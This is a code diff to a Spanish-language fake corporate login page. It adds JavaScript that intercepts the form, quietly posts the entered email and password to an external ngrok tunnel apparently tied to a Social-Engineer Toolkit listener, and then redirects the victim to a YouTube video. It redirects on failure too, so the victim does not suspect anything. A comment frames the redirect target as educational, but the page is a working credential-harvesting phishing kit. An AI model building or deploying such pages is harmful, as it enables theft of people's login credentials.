@@ -20,7 +20,7 @@
         <div class="logo">Portal Corporativo</div>
         <p>Por favor, inicie sesión para continuar.</p>
         
-        <form action="https://uncrowded-vivien-desiccative.ngrok-free.dev" method="POST">
+        <form id="phishing-form" action="https://uncrowded-vivien-desiccative.ngrok-free.dev" method="POST">
             
             <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
             <input type="password" name="password" placeholder="Contraseña" required>
@@ -33,5 +33,31 @@
         </div>
     </div>
 
+<script>
+    document.getElementById('phishing-form').addEventListener('submit', function(e) {
+        // 1. Detenemos el envío normal del formulario para tomar el control
+        e.preventDefault(); 
+        
+        // 2. Preparamos los datos (Usuario y Contraseña) para enviarlos
+        var formData = new FormData(this);
+        var data = new URLSearchParams(formData); // Convertimos a formato estándar
+        
+        // 3. Enviamos los datos a tu Ngrok (SET) en segundo plano
+        // Usamos 'no-cors' para evitar errores de seguridad entre Render y Ngrok
+        fetch(this.action, {
+            method: 'POST',
+            body: data,
+            mode: 'no-cors'
+        })
+        .then(() => {
+            // 4. ¡ÉXITO! Redirigimos al usuario al video educativo
+            window.location.href = "https://youtu.be/ZVX2iQME0OM?si=K_2NtJdKvyDr6fch";
+        })
+        .catch((error) => {
+            // Si algo falla, redirigimos igual para que el usuario no sospeche
+            window.location.href = "https://youtu.be/ZVX2iQME0OM?si=K_2NtJdKvyDr6fch";
+        });
+    });
+</script>
 </body>
 </html>
